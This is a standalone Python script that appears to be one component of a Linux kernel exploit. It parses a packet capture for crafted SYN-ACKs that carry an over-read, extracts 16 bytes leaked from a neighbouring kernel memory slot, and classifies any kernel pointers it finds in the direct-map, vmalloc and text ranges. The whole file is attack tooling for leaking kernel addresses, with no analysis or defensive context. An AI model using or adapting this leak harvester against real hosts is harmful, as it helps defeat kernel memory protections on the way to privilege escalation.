#!/usr/bin/env python3
"""overread_parse.py - parse 100-byte over-read SYN-ACKs from a pcap.

Over-read geometry with the saved_syn reclaim (source first byte 107):
  packet[0..19]  IP header (ihl=15, tot_len=100)
  packet[20..79] saved_syn TCP header copied into the IP-options area
  packet[84..99] neighbour slot bytes 0..15   (the leak)
"""
import struct, sys
RANGES=((0xFFFF800000000000,0xFFFFC87FFFFFFFFF,"direct-map"),
        (0xFFFFC90000000000,0xFFFFE8FFFFFFFFFF,"vmalloc"),
        (0xFFFFFFFF80000000,0xFFFFFFFFFFFFFFFF,"text/data"))
def kind(v):
    for lo,hi,n in RANGES:
        if lo<=v<=hi: return n
    return None
def main(path):
    d=open(path,'rb').read(); e='<' if d[:4] in (b'\xd4\xc3\xb2\xa1',b'\x4d\x3c\xb2\xa1') else '>'
    lt=struct.unpack_from(e+'I',d,20)[0]; off=24; n=over=0; hits=0
    while off+16<=len(d):
        _a,_b,incl,_o=struct.unpack_from(e+'IIII',d,off); off+=16
        p=d[off:off+incl]; off+=incl; n+=1
        if lt==1: p=p[14:]
        elif lt==113: p=p[16:]
        if len(p)<100 or p[0]>>4!=4: continue
        ihl=(p[0]&0xF)*4; tot=struct.unpack_from('!H',p,2)[0]
        if p[9]!=6 or ihl!=60 or tot!=100: continue
        # saved_syn TCP header copied into the IP options: sport at p[20:22]
        sport=struct.unpack_from('!H',p,20)[0]
        if sport!=53000: continue
        over+=1
        nb=p[84:100]
        print(f"--- over #{over}: sport={sport} dst={'.'.join(map(str,p[16:20]))}")
        print(f"    copy[20:84]: {p[20:84].hex(' ')}")
        print(f"    nb[84:100]:  {nb.hex(' ')}")
        for o in range(0,max(1,len(p)-7)):
            v=int.from_bytes(p[o:o+8],'little'); k=kind(v)
            if k: print(f"    PTR pkt+{o:#04x} {v:#018x} ({k})"); hits+=1
    print(f"== packets={n} over={over} ptr_hits={hits}")
    return 0
if __name__=='__main__': sys.exit(main(sys.argv[1]))
